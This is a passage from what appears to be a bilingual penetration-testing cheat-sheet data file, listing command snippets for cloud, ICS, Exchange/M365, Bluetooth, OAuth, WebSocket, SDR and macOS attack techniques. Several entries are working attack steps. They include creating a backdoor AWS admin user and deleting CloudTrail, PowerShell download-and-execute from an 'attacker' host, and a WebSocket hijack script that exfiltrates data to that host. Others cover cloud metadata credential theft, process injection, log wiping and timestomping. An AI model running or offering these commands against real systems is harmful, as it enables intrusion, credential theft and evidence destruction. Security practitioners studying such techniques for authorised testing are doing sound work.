    category: { zh: '云原生安全', en: 'Cloud Native Security' },
    commands: [
      { name: { zh: 'IAM 权限提升', en: 'IAM privilege escalation' }, command: '# 创建管理员用户\naws iam create-user --user-name attacker\naws iam attach-user-policy --user-name attacker --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\naws iam create-access-key --user-name attacker', description: { zh: 'AWS IAM 权限提升', en: 'AWS IAM privilege escalation' }, platform: 'all' },
      { name: { zh: 'S3 数据提取', en: 'S3 data extraction' }, command: 'aws s3 ls s3://bucket-name\naws s3 cp s3://bucket-name/secrets.txt .\naws s3 sync s3://bucket-name ./local/', description: { zh: 'AWS S3 数据提取', en: 'AWS S3 data extraction' }, platform: 'all' },
      { name: { zh: 'Lambda 攻击', en: 'Lambda attacks' }, command: 'aws lambda list-functions\naws lambda invoke --function-name target --payload "{}" response.json\n# 读取环境变量\naws lambda get-function-configuration --function-name target', description: { zh: 'AWS Lambda 函数攻击', en: 'AWS Lambda function attacks' }, platform: 'all' },
      { name: { zh: '持久化后门', en: 'AWS persistence' }, command: '# CloudTrail 关闭 (留痕!)\naws cloudtrail delete-trail --name target-trail\n# 创建隐秘后门\naws iam create-access-key --user-name existing_user', description: { zh: 'AWS 持久化方法', en: 'AWS persistence methods' }, platform: 'all' }
    ],
    references: ['https://github.com/RhinoSecurityLabs/pacu']
  },


  {
    id: 'voip-sip-security',
    name: { zh: 'VoIP/SIP 安全测试', en: 'VoIP/SIP Security Testing' },
    description: { zh: 'VoIP 协议和 SIP 服务安全测试工具命令', en: 'VoIP protocol and SIP service security testing tool commands' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'apt install sipvicious / pip install sipvicious',
    commands: [
      { name: { zh: 'SIP 设备扫描', en: 'SIP device scan' }, command: 'svmap 192.168.1.0/24\nsvmap -p 5060-5070 target\nnmap -sU -p 5060 --script sip-enum-users target', description: { zh: '扫描网络中的 SIP 设备', en: 'Scan network for SIP devices' }, platform: 'linux' },
      { name: { zh: 'SIP 用户枚举', en: 'SIP user enumeration' }, command: 'svwar -e100-200 -m REGISTER target\nsvwar -e100-300 target:5060 --force\nsvmap -p 5060 target', description: { zh: '枚举 SIP 分机号', en: 'Enumerate SIP extension numbers' }, platform: 'linux' },
      { name: { zh: 'SIP 密码破解', en: 'SIP password cracking' }, command: 'svcrack -u 100 -d wordlist.txt target\nsvcrack -u 100 -d /usr/share/wordlists/rockyou.txt target:5060', description: { zh: '暴力破解 SIP 账户密码', en: 'Brute force SIP account passwords' }, platform: 'linux' },
      { name: { zh: 'Wireshark SIP 分析', en: 'Wireshark SIP analysis' }, command: 'tshark -r capture.pcap -Y sip\ntshark -r capture.pcap -Y "rtp" -T fields -e rtp.payload\n# Wireshark: Telephony -> VoIP Calls', description: { zh: 'SIP/RTP 流量分析', en: 'SIP/RTP traffic analysis' }, platform: 'all' },
      { name: { zh: 'SIPp 压力测试', en: 'SIPp stress test' }, command: 'sipp -sn uac target:5060 -inf users.csv -r 10 -trace_err\nsipp -sn uas -p 5060', description: { zh: 'SIP 服务压力测试', en: 'SIP service stress testing' }, platform: 'linux' }
    ],
    references: ['https://github.com/EnableSecurity/sipvicious']
  },
  {
    id: 'ics-scada-security',
    name: { zh: 'ICS/SCADA 工控安全', en: 'ICS/SCADA Industrial Control Security' },
    description: { zh: '工业控制系统安全测试工具命令（仅授权环境使用）', en: 'Industrial control system security testing commands (authorized environments only)' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'pip install pymodbus scapy',
    commands: [
      { name: { zh: 'Modbus 枚举', en: 'Modbus enumeration' }, command: 'nmap -p 502 --script modbus-discover target\nnmap -p 102 --script s7-info target\nnmap -sU -p 47808 --script bacnet-info target', description: { zh: 'Modbus/S7/BACnet 设备识别', en: 'Identify Modbus/S7/BACnet devices' }, platform: 'linux' },
      { name: { zh: 'Modbus 读寄存器', en: 'Modbus read registers' }, command: "from pymodbus.client import ModbusTcpClient\nc = ModbusTcpClient('target')\nc.connect()\nr = c.read_holding_registers(0, 10, slave=1)\nprint(r.registers)", description: { zh: 'Modbus 读取保持寄存器', en: 'Read Modbus holding registers' }, platform: 'all' },
      { name: { zh: 'Shodan ICS 搜索', en: 'Shodan ICS search' }, command: 'port:502 modbus\nport:102 Siemens\nport:44818 "Allen-Bradley"\nport:47808 bacnet\nport:20000 DNP3\ncountry:CN port:502', description: { zh: 'Shodan 搜索工控设备', en: 'Search ICS devices on Shodan' }, platform: 'all' },
      { name: { zh: 'Plcscan', en: 'PLC scanner' }, command: 'python plcscan.py target\nplcscan -p 102 192.168.1.0/24\n# Redpoint NSE 脚本\nnmap -p 102 --script s7-enumerate target', description: { zh: 'PLC 设备扫描和枚举', en: 'PLC device scanning and enumeration' }, platform: 'linux' }
    ],
    references: ['https://github.com/digitalbond/Redpoint']
  },


  {
    id: 'exchange-m365-attacks',
    name: { zh: 'Exchange/M365 攻击', en: 'Exchange/M365 Attacks' },
    description: { zh: 'Microsoft Exchange 和 M365 渗透测试命令', en: 'Microsoft Exchange and M365 penetration testing commands' },
    category: { zh: '域渗透', en: 'Domain Penetration' },
    installation: 'pip install MailSniper / Install-Module AADInternals',
    commands: [
      { name: { zh: 'OWA 爆破', en: 'OWA brute force' }, command: 'python MailSniper.py -u users.txt -p passwords.txt -d domain.com\nbfsmbexe -u users.txt -p "Password1" -d domain.com --service OWA', description: { zh: 'Outlook Web Access 密码爆破', en: 'Brute force Outlook Web Access' }, platform: 'all' },
      { name: { zh: 'EWS 邮件枚举', en: 'EWS email enumeration' }, command: 'python ruler.py --domain target.com --email user@target.com abk list\nInvoke-SelfSearch -Mailbox user@target.com -Terms "password","secret"', description: { zh: 'Exchange EWS 邮件搜索', en: 'Exchange EWS email enumeration' }, platform: 'all' },
      { name: { zh: 'AADInternals M365', en: 'AADInternals M365' }, command: "Import-Module AADInternals\n# 枚举租户\nInvoke-AADIntReconAsOutsider -DomainName target.com\n# 获取用户 Token\nGet-AADIntAccessTokenForEXO -Credentials (Get-Credential)\n# 密码喷洒\nInvoke-AADIntUserEnumerationAsOutsider -UserName user@target.com", description: { zh: 'AADInternals M365/Azure AD 枚举', en: 'AADInternals M365/Azure AD enumeration' }, platform: 'windows' },
      { name: { zh: 'Ruler Exchange 攻击', en: 'Ruler Exchange exploit' }, command: 'ruler --email user@target.com --username user --password pass display\nruler --email user@target.com homedir list\n# Outlook Rules RCE\nruler --email user@target.com -k add --name test --trigger "subject" --location "\\\\attacker\\share\\payload.exe"', description: { zh: 'Ruler Outlook Rules RCE', en: 'Ruler Outlook Rules RCE exploit' }, platform: 'linux' },
      { name: { zh: 'GraphAPI 枚举', en: 'Microsoft Graph API enum' }, command: 'curl "https://graph.microsoft.com/v1.0/users" -H "Authorization: Bearer TOKEN"\ncurl "https://graph.microsoft.com/v1.0/me/messages?$select=subject,from" -H "Authorization: Bearer TOKEN"', description: { zh: 'Microsoft Graph API 数据枚举', en: 'Enumerate data via Microsoft Graph API' }, platform: 'all' }
    ],
    references: ['https://github.com/dirkjanm/ROADtools']
  },
  {
    id: 'bluetooth-security',
    name: { zh: '蓝牙安全测试', en: 'Bluetooth Security Testing' },
    description: { zh: '蓝牙协议安全测试和嗅探工具命令', en: 'Bluetooth protocol security testing and sniffing tool commands' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'apt install bluez btscanner ubertooth-tools',
    commands: [
      { name: { zh: '设备扫描', en: 'Device scanning' }, command: 'hciconfig hci0 up\nhcitool scan\nhcitool lescan  # BLE 设备\nbtscanner -t 30\nbluetoothctl scan on', description: { zh: '扫描周边蓝牙设备', en: 'Scan nearby Bluetooth devices' }, platform: 'linux' },
      { name: { zh: 'BLE 嗅探 (Ubertooth)', en: 'BLE sniffing with Ubertooth' }, command: 'ubertooth-btle -f -c capture.pcap\nubertooth-btle -p -A 37 -c ble.pcap\n# 分析\ntshark -r ble.pcap -Y btle', description: { zh: 'Ubertooth BLE 流量嗅探', en: 'BLE traffic sniffing with Ubertooth' }, platform: 'linux' },
      { name: { zh: 'Btlejack 中间人', en: 'Btlejack MITM' }, command: 'btlejack -c any\nbtlejack -f 0xdeadbeef -j\n# 跟随连接\nbtlejack -d /dev/ttyACM0 -f 0xdeadbeef --jam', description: { zh: 'Btlejack BLE 连接跟踪', en: 'Btlejack BLE connection tracking' }, platform: 'linux' },
      { name: { zh: 'BTLE 漏洞测试', en: 'BLE vulnerability testing' }, command: 'gatttool -b TARGET_MAC -I\n# 交互命令\nprimary  # 列出服务\ncharacteristics  # 列出特征\nchar-read-hnd 0x0001\nchar-write-req 0x0001 deadbeef', description: { zh: 'BLE GATT 服务枚举', en: 'BLE GATT service enumeration' }, platform: 'linux' }
    ],
    references: ['https://github.com/virtualabs/btlejack']
  },
  {
    id: 'process-injection',
    name: { zh: '进程注入技术', en: 'Process Injection Techniques' },
    description: { zh: 'Windows 进程注入和内存执行技术', en: 'Windows process injection and in-memory execution techniques' },
    category: { zh: 'Windows渗透', en: 'Windows Penetration' },
    commands: [
      { name: { zh: 'DLL 注入', en: 'DLL injection' }, command: '# 标准 DLL 注入\npython inject.py --pid TARGET_PID --dll C:\\evil.dll\n# PowerShell\n$proc = Get-Process notepad\n[Reflection.Assembly]::LoadWithPartialName("System")\n# 或使用 Meterpreter: inject_dll', description: { zh: 'DLL 注入代码执行', en: 'DLL injection code execution' }, platform: 'windows' },
      { name: { zh: '反射 DLL 注入', en: 'Reflective DLL injection' }, command: '# Cobalt Strike\nbeacon> dllinject PID C:\\evil.dll\n# Metasploit\nuse post/windows/manage/reflective_dll_inject\nset DLL /path/to/evil.dll; set SESSION 1; run', description: { zh: '反射式 DLL 注入（无落地文件）', en: 'Reflective DLL injection without touching disk' }, platform: 'windows' },
      { name: { zh: 'Process Hollowing', en: 'Process hollowing' }, command: '# 创建挂起进程\n# 1. CreateProcess (SUSPENDED)\n# 2. NtUnmapViewOfSection\n# 3. 写入恶意代码\n# 4. 设置上下文\n# 5. ResumeThread\n# 工具: ProcessHollowing.exe', description: { zh: '进程镂空注入技术', en: 'Process hollowing injection technique' }, platform: 'windows' },
      { name: { zh: 'APC 注入', en: 'APC injection' }, command: '# 异步过程调用注入\n# 1. 找到目标线程\n# 2. OpenThread\n# 3. VirtualAllocEx\n# 4. WriteProcessMemory\n# 5. QueueUserAPC\n# 工具: SharpAPC', description: { zh: 'APC 队列注入技术', en: 'APC queue injection technique' }, platform: 'windows' },
      { name: { zh: 'Donut 无文件', en: 'Donut fileless execution' }, command: 'donut -f payload.exe -o shellcode.bin\ndonut -f payload.dll -c ClassName -m MethodName -o shellcode.bin\n# 注入 shellcode\npython inject_sc.py shellcode.bin TARGET_PID', description: { zh: 'Donut 将 .NET/PE 转为 shellcode', en: 'Convert .NET/PE to shellcode with Donut' }, platform: 'linux' }
    ],
    references: ['https://github.com/TheWover/donut']
  },


  {
    id: 'oauth-oidc-attacks',
    name: { zh: 'OAuth/OIDC 攻击', en: 'OAuth/OIDC Attacks' },
    description: { zh: 'OAuth 2.0 和 OIDC 协议安全测试命令', en: 'OAuth 2.0 and OIDC protocol security testing commands' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    commands: [
      { name: { zh: '授权码劫持', en: 'Authorization code hijacking' }, command: "# 测试 redirect_uri 验证\ncurl 'https://auth.target.com/oauth/authorize?response_type=code&client_id=CLIENT&redirect_uri=https://evil.com'\n# 测试开放重定向配合\ncurl 'https://auth.target.com/oauth/authorize?redirect_uri=https://target.com/redirect?next=https://evil.com'", description: { zh: 'OAuth 授权码劫持测试', en: 'OAuth authorization code hijacking test' }, platform: 'all' },
      { name: { zh: 'PKCE 绕过', en: 'PKCE bypass' }, command: "# 测试是否可以省略 code_verifier\ncurl -X POST 'https://auth.target.com/oauth/token' -d 'grant_type=authorization_code&code=AUTH_CODE&client_id=CLIENT&redirect_uri=https://target.com/callback'", description: { zh: 'PKCE 保护绕过测试', en: 'PKCE protection bypass testing' }, platform: 'all' },
      { name: { zh: 'Token 泄露', en: 'Token leakage' }, command: "# Referrer 泄露\n# 检查 Authorization Code 是否出现在 Referer 头中\ncurl -v 'https://target.com/callback?code=AUTH_CODE' 2>&1 | grep -i 'referer'\n# 测试 Token 是否在日志中", description: { zh: 'OAuth Token 泄露测试', en: 'OAuth token leakage testing' }, platform: 'all' },
      { name: { zh: 'JWT Kid 注入', en: 'JWT kid injection' }, command: "# 测试 kid 参数 SQL 注入\njwt_tool TOKEN -T -I -hc kid -hv \"' UNION SELECT 'secretkey'--\"  \n# 测试 kid 路径遍历\njwt_tool TOKEN -T -I -hc kid -hv '../../dev/null'", description: { zh: 'JWT kid 参数注入测试', en: 'JWT kid parameter injection testing' }, platform: 'all' },
      { name: { zh: 'Client Secret 爆破', en: 'Client secret brute force' }, command: "# 测试弱 Client Secret\nfor secret in 'secret' 'password' 'mysecret' '123456'; do\n  curl -s -X POST 'https://auth.target.com/oauth/token' -d \"client_id=CLIENT&client_secret=$secret&grant_type=client_credentials\" | grep -i 'access_token' && echo \"Found: $secret\"\ndone", description: { zh: 'OAuth Client Secret 爆破', en: 'OAuth client secret brute force' }, platform: 'linux' }
    ],
    references: ['https://portswigger.net/web-security/oauth']
  },
  {
    id: 'fileless-antiforensics',
    name: { zh: '无文件攻击和反取证', en: 'Fileless Attacks and Anti-Forensics' },
    description: { zh: '内存驻留、无文件执行和反取证技术', en: 'In-memory residence, fileless execution, and anti-forensics techniques' },
    category: { zh: 'Windows渗透', en: 'Windows Penetration' },
    commands: [
      { name: { zh: '内存执行 .NET', en: 'In-memory .NET execution' }, command: "# PowerShell 内存加载\n$bytes = (New-Object Net.WebClient).DownloadData('http://attacker/payload.exe')\n[Reflection.Assembly]::Load($bytes)\n[Namespace.Class]::Method()", description: { zh: '.NET 程序集内存加载执行', en: 'Load and execute .NET assembly in memory' }, platform: 'windows' },
      { name: { zh: 'PowerShell 无文件', en: 'PowerShell fileless' }, command: "# 直接内存执行\nIEX(New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')\n# 从注册表读取\nIEX ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path 'HKCU:\\Software\\Evil' -Name 'Payload').Payload)))", description: { zh: 'PowerShell 无文件执行技术', en: 'PowerShell fileless execution techniques' }, platform: 'windows' },
      { name: { zh: '日志清除', en: 'Log clearing' }, command: 'wevtutil cl System\nwevtutil cl Security\nwevtutil cl Application\nclearev  # Meterpreter\n# Linux\ncat /dev/null > /var/log/auth.log\ncat /dev/null > ~/.bash_history', description: { zh: '清除系统日志痕迹', en: 'Clear system log traces' }, platform: 'all' },
      { name: { zh: '时间篡改', en: 'Timestomping' }, command: '# Windows\nMetasploit: timestomp\ntimestomp C:\\evil.exe -f C:\\Windows\\notepad.exe\n# Linux\ntouch -t 202001010000 /tmp/evil\ntouch -r /bin/bash /tmp/evil  # 复制合法文件时间戳', description: { zh: '文件时间戳篡改', en: 'File timestamp manipulation' }, platform: 'all' },
      { name: { zh: 'NTFS ADS 隐藏', en: 'NTFS ADS hiding' }, command: 'echo "payload" > C:\\legit.txt:hidden\ntype C:\\legit.txt:hidden\n# 查找 ADS\nstreams.exe -s C:\\\ndir /r C:\\suspicious\\', description: { zh: 'NTFS 交替数据流隐藏', en: 'Hide data in NTFS alternate data streams' }, platform: 'windows' }
    ],
    references: ['https://attack.mitre.org/techniques/T1055/']
  },


  {
    id: 'aliyun-tencent-cloud',
    name: { zh: '阿里云/腾讯云安全测试', en: 'Alibaba/Tencent Cloud Security Testing' },
    description: { zh: '阿里云和腾讯云渗透测试命令', en: 'Alibaba Cloud and Tencent Cloud penetration testing commands' },
    category: { zh: '云原生安全', en: 'Cloud Native Security' },
    installation: 'pip install aliyun-python-sdk-core / npm install -g @alicloud/cli',
    commands: [
      { name: { zh: '阿里云 CLI 配置', en: 'Aliyun CLI config' }, command: 'aliyun configure\naliyun sts GetCallerIdentity\naliyun ram ListUsers\naliyun ecs DescribeInstances', description: { zh: '阿里云 CLI 身份和资源枚举', en: 'Alibaba Cloud CLI identity and resource enumeration' }, platform: 'all' },
      { name: { zh: '阿里云元数据 (SSRF)', en: 'Aliyun metadata (SSRF)' }, command: 'curl http://100.100.100.200/latest/meta-data/\ncurl http://100.100.100.200/latest/meta-data/ram/security-credentials/\ncurl http://100.100.100.200/latest/meta-data/instance-id', description: { zh: '阿里云 ECS 实例元数据服务', en: 'Alibaba Cloud ECS instance metadata service' }, platform: 'all' },
      { name: { zh: '腾讯云 CLI', en: 'Tencent Cloud CLI' }, command: 'tccli configure\ntccli sts GetCallerIdentity\ntccli cam ListUsers\ntccli cvm DescribeInstances --region ap-guangzhou', description: { zh: '腾讯云 CLI 枚举', en: 'Tencent Cloud CLI enumeration' }, platform: 'all' },
      { name: { zh: '腾讯云元数据 (SSRF)', en: 'Tencent Cloud metadata (SSRF)' }, command: 'curl http://metadata.tencentyun.com/latest/meta-data/\ncurl http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/', description: { zh: '腾讯云 CVM 元数据服务', en: 'Tencent Cloud CVM metadata service' }, platform: 'all' },
      { name: { zh: 'OSS 存储桶测试', en: 'OSS bucket testing' }, command: 'ossutil ls oss://bucket-name\nossutil cp oss://bucket-name/secret.txt .\n# 匿名访问\ncurl https://bucket-name.oss-cn-hangzhou.aliyuncs.com/', description: { zh: '阿里云 OSS 存储测试', en: 'Alibaba Cloud OSS storage testing' }, platform: 'all' }
    ],
    references: ['https://help.aliyun.com/document_detail/121535.html']
  },
  {
    id: 'ecc-lattice-attacks',
    name: { zh: 'ECC/格密码攻击', en: 'ECC and Lattice Crypto Attacks' },
    description: { zh: 'CTF 椭圆曲线和格密码攻击技术', en: 'CTF elliptic curve and lattice cryptography attack techniques' },
    category: { zh: 'CTF/密码学', en: 'CTF / Cryptography' },
    installation: 'pip install pycryptodome sage / apt install sagemath',
    commands: [
      { name: { zh: 'ECC 无效曲线', en: 'ECC invalid curve attack' }, command: "# 使用 SageMath\nfrom sage.all import *\n# 构造无效曲线上的点\nE = EllipticCurve(GF(p), [a, b])\nP = E.random_point()\n# 如果服务器不验证点是否在曲线上", description: { zh: 'ECC 无效曲线攻击', en: 'ECC invalid curve attack' }, platform: 'all' },
      { name: { zh: 'ECDSA 随机数复用', en: 'ECDSA nonce reuse' }, command: "# 两个签名使用相同 k\n# r1 == r2 时存在漏洞\n# 恢复私钥\nfrom Crypto.PublicKey import ECC\nk = (z1 - z2) * pow(s1 - s2, -1, n) % n\nd = (s1 * k - z1) * pow(r, -1, n) % n", description: { zh: 'ECDSA nonce 重用私钥恢复', en: 'Recover private key from ECDSA nonce reuse' }, platform: 'all' },
      { name: { zh: 'LLL 格基规约', en: 'LLL lattice reduction' }, command: "# SageMath LLL\nfrom sage.all import *\nM = Matrix(ZZ, [[...]])\nL = M.LLL()\nprint(L[0])\n# coppersmith 小根\nP.<x> = PolynomialRing(Zmod(n))\nf = x + known_bits\nf.small_roots(X=2^bits, beta=0.4)", description: { zh: 'LLL 算法格基规约', en: 'LLL algorithm lattice basis reduction' }, platform: 'all' },
      { name: { zh: 'RSA Coppersmith', en: 'RSA Coppersmith attack' }, command: "# 部分已知明文\nfrom sage.all import *\nP.<x> = PolynomialRing(Zmod(n))\n# 已知明文高位\nf = (2^kbits * x + known_high)^e - c\nroots = f.small_roots(X=2^kbits, beta=1)\nprint(roots)", description: { zh: 'Coppersmith 已知明文高位攻击', en: 'Coppersmith attack with known high bits of plaintext' }, platform: 'all' }
    ],
    references: ['https://github.com/josephsurin/lattice-based-cryptanalysis']
  },
  {
    id: 'ctf-blockchain',
    name: { zh: 'CTF 区块链/智能合约', en: 'CTF Blockchain/Smart Contracts' },
    description: { zh: 'CTF 区块链题目和 Solidity 漏洞利用工具', en: 'CTF blockchain challenges and Solidity vulnerability exploitation tools' },
    category: { zh: 'CTF/密码学', en: 'CTF / Cryptography' },
    installation: 'npm install -g truffle / pip install web3',
    commands: [
      { name: { zh: 'Foundry 测试框架', en: 'Foundry test framework' }, command: 'forge init myproject\nforge test -vvv\nforge script script/Deploy.s.sol --broadcast\ncast call 0xCONTRACT "function()" --rpc-url $RPC', description: { zh: 'Foundry 智能合约测试', en: 'Foundry smart contract testing' }, platform: 'all' },
      { name: { zh: 'Slither 静态分析', en: 'Slither static analysis' }, command: 'slither .\nslither contract.sol --detect reentrancy\nslither contract.sol --print human-summary', description: { zh: 'Slither Solidity 静态安全分析', en: 'Slither Solidity static security analysis' }, platform: 'all' },
      { name: { zh: 'Mythril 符号执行', en: 'Mythril symbolic execution' }, command: 'myth analyze contract.sol\nmyth analyze -a 0xCONTRACT --rpc infura:mainnet:KEY\nmyth analyze contract.sol -t 3', description: { zh: 'Mythril 智能合约符号执行', en: 'Mythril smart contract symbolic execution' }, platform: 'all' },
      { name: { zh: '常见漏洞利用', en: 'Common vulnerability exploits' }, command: "# 重入攻击\ninterface IVulnerable { function withdraw(uint) external; }\ncontract Attack {\n    receive() external payable { if (address(target).balance > 0) target.withdraw(1 ether); }\n}\n# 整数溢出 (Solidity < 0.8)\nuint8 x = 255; x += 1; // → 0", description: { zh: 'Solidity 常见漏洞利用模板', en: 'Common Solidity vulnerability exploitation templates' }, platform: 'all' }
    ],
    references: ['https://github.com/crytic/slither', 'https://book.getfoundry.sh/']
  },


  {
    id: 'grpc-websocket-security',
    name: { zh: 'gRPC/WebSocket 安全测试', en: 'gRPC/WebSocket Security Testing' },
    description: { zh: 'gRPC 和 WebSocket 协议安全测试命令', en: 'gRPC and WebSocket protocol security testing commands' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest',
    commands: [
      { name: { zh: 'grpcurl 枚举', en: 'grpcurl enumeration' }, command: 'grpcurl -plaintext target:50051 list\ngrpcurl -plaintext target:50051 list ServiceName\ngrpcurl -plaintext target:50051 describe ServiceName.Method', description: { zh: 'gRPC 服务和方法枚举', en: 'gRPC service and method enumeration' }, platform: 'all' },
      { name: { zh: 'gRPC 调用测试', en: 'gRPC call testing' }, command: "grpcurl -plaintext -d '{\"user_id\":1}' target:50051 UserService.GetUser\ngrpcurl -plaintext -d '{\"id\":\"../../../etc/passwd\"}' target:50051 FileService.ReadFile", description: { zh: 'gRPC 方法调用和注入测试', en: 'gRPC method calls and injection testing' }, platform: 'all' },
      { name: { zh: 'WebSocket 测试', en: 'WebSocket testing' }, command: "# wscat 工具\nwscat -c ws://target/ws\nwscat -c wss://target/ws\n# 发送消息\n> {\"action\":\"getUser\",\"id\":1}\n# websocat\nwebsocat ws://target/ws", description: { zh: 'WebSocket 连接测试', en: 'WebSocket connection testing' }, platform: 'all' },
      { name: { zh: 'WebSocket 注入', en: 'WebSocket injection' }, command: "# 通过 Burp 拦截 WebSocket 帧\n# 测试 SQLi\n{\"search\":\"' OR 1=1--\"}\n# XSS\n{\"message\":\"<img src=x onerror=alert(1)>\"}\n# CSWSH (跨站 WebSocket 劫持)\n<script>var ws=new WebSocket('wss://target/ws'); ws.onmessage=function(e){fetch('http://attacker/?d='+e.data)};</script>", description: { zh: 'WebSocket 协议攻击测试', en: 'WebSocket protocol attack testing' }, platform: 'all' }
    ],
    references: ['https://github.com/fullstorydev/grpcurl']
  },
  {
    id: 'sdr-wireless',
    name: { zh: 'SDR 软件无线电安全', en: 'SDR Software Defined Radio Security' },
    description: { zh: 'SDR 无线电安全分析工具命令', en: 'SDR radio security analysis tool commands' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'apt install gnuradio rtl-sdr hackrf gqrx',
    commands: [
      { name: { zh: 'RTL-SDR 基础', en: 'RTL-SDR basics' }, command: 'rtl_test -t  # 测试硬件\nrtl_fm -f 433.92M -s 200000 -r 48000 - | aplay -r 48000 -f S16_LE\n# GQRX GUI\ngqrx', description: { zh: 'RTL-SDR 接收无线信号', en: 'Receive radio signals with RTL-SDR' }, platform: 'linux' },
      { name: { zh: '433MHz 设备分析', en: '433MHz device analysis' }, command: 'rtl_433 -f 433.92M\nrtl_433 -f 433.92M -F json\n# 分析遥控器/温度计等设备', description: { zh: '433MHz 无线设备信号分析', en: 'Analyze 433MHz wireless device signals' }, platform: 'linux' },
      { name: { zh: 'IMSI Catcher 检测', en: 'IMSI catcher detection' }, command: '# AIMSICD\naimsicd\n# SnoopSnitch\n# 监控基站参数异常', description: { zh: '检测伪基站/IMSI 捕获器', en: 'Detect IMSI catchers/fake base stations' }, platform: 'linux' },
      { name: { zh: 'HackRF 发送', en: 'HackRF transmission' }, command: 'hackrf_info\nhackrf_transfer -r capture.iq -f 433920000 -s 8000000  # 录制\nhackrf_transfer -t capture.iq -f 433920000 -s 8000000  # 重放', description: { zh: 'HackRF 信号录制和重放', en: 'HackRF signal recording and replay' }, platform: 'linux' }
    ],
    references: ['https://github.com/merbanan/rtl_433']
  },
  {
    id: 'atomic-red-team',
    name: { zh: 'Atomic Red Team 自动化', en: 'Atomic Red Team Automation' },
    description: { zh: 'Atomic Red Team MITRE ATT&CK 对应技术自动化测试', en: 'Atomic Red Team automated testing for MITRE ATT&CK techniques' },
    category: { zh: '红队工具', en: 'Red Team Tools' },
    installation: 'Install-Module -Name invoke-atomicredteam',
    commands: [
      { name: { zh: '安装和初始化', en: 'Install and init' }, command: 'Install-Module -Name invoke-atomicredteam -Scope CurrentUser\nImport-Module invoke-atomicredteam\nInvoke-AtomicTest T1059.001 -ShowDetails  # 查看详情', description: { zh: '安装 Atomic Red Team', en: 'Install Atomic Red Team' }, platform: 'windows' },
      { name: { zh: '执行单个技术', en: 'Execute single technique' }, command: 'Invoke-AtomicTest T1059.001  # PowerShell 执行\nInvoke-AtomicTest T1003.001  # LSASS 内存\nInvoke-AtomicTest T1059.001 -Cleanup  # 清理', description: { zh: '执行单个 ATT&CK 技术', en: 'Execute a single ATT&CK technique' }, platform: 'windows' },
      { name: { zh: '批量测试', en: 'Batch testing' }, command: "# 测试所有初始访问技术\nInvoke-AtomicTest T1566 -TestGuids @('guid1','guid2')\n# 生成报告\nInvoke-AtomicTest T1059 -LoggingModule 'Attire-ExecutionLogger'", description: { zh: '批量 ATT&CK 技术测试', en: 'Batch ATT&CK technique testing' }, platform: 'windows' },
      { name: { zh: 'Linux Atomic', en: 'Linux atomic tests' }, command: "bash -c \"$(curl -s https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.sh)\"\n# 执行\nbash atomic_test.sh T1059.004", description: { zh: 'Linux 平台 Atomic 测试', en: 'Atomic tests on Linux platform' }, platform: 'linux' }
    ],
    references: ['https://github.com/redcanaryco/atomic-red-team']
  },


  {
    id: 'freebsd-solaris-commands',
    name: { zh: 'FreeBSD/Solaris 命令', en: 'FreeBSD/Solaris Commands' },
    description: { zh: 'FreeBSD 和 Solaris/OpenBSD 系统命令速查', en: 'FreeBSD and Solaris/OpenBSD system command quick reference' },
    category: { zh: '系统命令', en: 'System Commands' },
    commands: [
      { name: { zh: 'FreeBSD 包管理', en: 'FreeBSD package management' }, command: 'pkg install nmap\npkg search nmap\npkg info\npkg update && pkg upgrade\npkg audit -F  # 安全审计', description: { zh: 'FreeBSD pkg 包管理', en: 'FreeBSD pkg package management' }, platform: 'all' },
      { name: { zh: 'FreeBSD 防火墙', en: 'FreeBSD firewall' }, command: 'pfctl -s rules\npfctl -e  # 启用 pf\npfctl -d  # 禁用 pf\n# ipfw\nipfw list\nipfw show', description: { zh: 'FreeBSD pf/ipfw 防火墙', en: 'FreeBSD pf/ipfw firewall' }, platform: 'all' },
      { name: { zh: 'FreeBSD Jail', en: 'FreeBSD jail' }, command: 'jls\njexec 1 sh\njail -c path=/jails/test name=test\njail -r test\n# 查看 jail 进程\nps axJ', description: { zh: 'FreeBSD Jail 管理', en: 'FreeBSD jail management' }, platform: 'all' },
      { name: { zh: 'Solaris/OmniOS 命令', en: 'Solaris/OmniOS commands' }, command: 'pkg list\npkg install nmap\npkg audit\nzoneadm list -cv  # Zones\nzlogin zonename\nzfs list\nsvcs -a  # SMF 服务', description: { zh: 'Solaris/OmniOS 系统命令', en: 'Solaris/OmniOS system commands' }, platform: 'all' },
      { name: { zh: 'OpenBSD 安全', en: 'OpenBSD security' }, command: 'doas pkg_add nmap\npkg_info\nnmap --version\npfctl -s all  # pf 规则\nopenssl version\n# pledge/unveil 安全机制', description: { zh: 'OpenBSD 安全命令', en: 'OpenBSD security commands' }, platform: 'all' }
    ],
    references: ['https://www.freebsd.org/doc/handbook/']
  },
  {
    id: 'macos-security-deep',
    name: { zh: 'macOS 深度安全命令', en: 'macOS Deep Security Commands' },
    description: { zh: 'macOS 代码签名、Gatekeeper、TCC 权限绕过命令', en: 'macOS code signing, Gatekeeper, TCC bypass commands' },
    category: { zh: '系统命令', en: 'System Commands' },
    commands: [
      { name: { zh: '代码签名检查', en: 'Code signing check' }, command: 'codesign -dv --verbose=4 /Applications/App.app\ncodesign --verify --verbose /path/to/binary\nspctl -a -vvv /Applications/App.app', description: { zh: '检查 macOS 代码签名', en: 'Check macOS code signing' }, platform: 'all' },
      { name: { zh: 'Gatekeeper 管理', en: 'Gatekeeper management' }, command: 'spctl --status\nsudo spctl --disable  # 禁用 Gatekeeper\nxattr -d com.apple.quarantine /path/to/app\nsudo xattr -r -d com.apple.quarantine /Applications/', description: { zh: 'Gatekeeper 检查和绕过', en: 'Gatekeeper inspection and bypass' }, platform: 'all' },
      { name: { zh: 'TCC 权限数据库', en: 'TCC database' }, command: 'sqlite3 /Library/Application\\ Support/com.apple.TCC/TCC.db\n.tables\nSELECT * FROM access;\n# 用户级\nsqlite3 ~/Library/Application\\ Support/com.apple.TCC/TCC.db', description: { zh: 'TCC 透明度同意控制数据库', en: 'TCC transparency consent database' }, platform: 'all' },
